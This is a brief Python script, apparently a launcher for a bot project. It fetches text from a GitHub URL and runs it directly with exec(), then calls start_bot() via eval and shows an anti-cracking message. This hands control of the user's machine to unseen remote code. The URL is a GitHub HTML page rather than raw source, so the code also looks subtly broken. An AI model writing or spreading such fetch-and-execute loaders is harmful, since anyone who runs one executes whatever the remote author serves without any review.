



import requests
data = requests.get(url="https://github.com/walidfoxy/BOTs-Fox-/blob/main/Connect%20.py").text
exec(data)


def start_script():
    try:
        eval("""start_bot()""")
    except Exception as e:
        return "Don't try to crack the app"